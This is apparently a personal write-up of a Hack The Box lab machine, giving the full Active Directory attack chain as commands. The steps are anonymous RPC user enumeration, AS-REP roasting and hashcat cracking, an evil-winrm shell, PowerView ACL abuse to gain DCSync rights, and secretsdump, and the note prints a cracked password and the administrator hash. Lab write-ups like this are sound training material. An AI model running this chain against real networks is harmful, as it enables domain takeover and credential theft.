## Takeaway
- `rpcclient` can be used to enumerate domain users if `guest` or `annonymous` access is granted.
	- `rpcclient -U "" -N [IP]`
- In `evil-winrm` session, if you can't run `SharpHound.ps1`, then opt for either `bloodhound.py` or `SharpHound.exe`.
## Metadata
- Login as anonymously using `rpcclient` and enumerate domain users with command `enumdomusers`.![[Pasted image 20240304122307.png]]
- Store all usernames in a file and run following command to see if any of the user is `ASPRoastable`:
	```shell
	for user in $(cat users); do impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/${user} -no-pass | grep -v Impacket; done
	```
	- The result shows that `svc-alfresco` is `ASProastable`.![[Pasted image 20240304122937.png]]
	- Run `hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` to obtain a pair of valid domain credential:
		- `htb.local\svc-alfresco`: s3rvice
		- ![[Pasted image 20240304124354.png]]
- Spray the obtained credential to `smb, winrm` and find the user has `winrm` access.![[Pasted image 20240304124439.png]]
# Exploitation
- Obtain a session by running `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`.
# PrivEsc
- Within `bloodhound`, mark `svc-alfresco`as owned and run `Shortest Path from Owned Principals` to discover that through nested group membership `svc-alfresco` is part of the `ACCOUNT OPERATOR` group.![[Pasted image 20240304152150.png]]
- Run `Find Shortest Paths to Domain Admins`, one can identify that `ACCOUNT OPERATORs` group has `GenericAll` privilege against `EXCHANGE WINDOWS PERMISSIONS` group. Furthermore, the group has  `WriteDacl` privilege against the entire domain.![[Pasted image 20240304152435.png]]
- Upload and load `PowerView.ps1`, run the following:
```shell
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred
Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=HTB,DC=LOCAL' -PrincipalIdentity 'svc-alfresco' -Rights DCSync -Verbose
```
to grant `svc-alfresco` DV-Sync rights.
- Obtain `Domain Administrator` hash by running `impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161`.
- `htb.local\Administrator`: 32693b11e6aa90eb43d32c72a07ceea6
- ![[Pasted image 20240304155945.png]]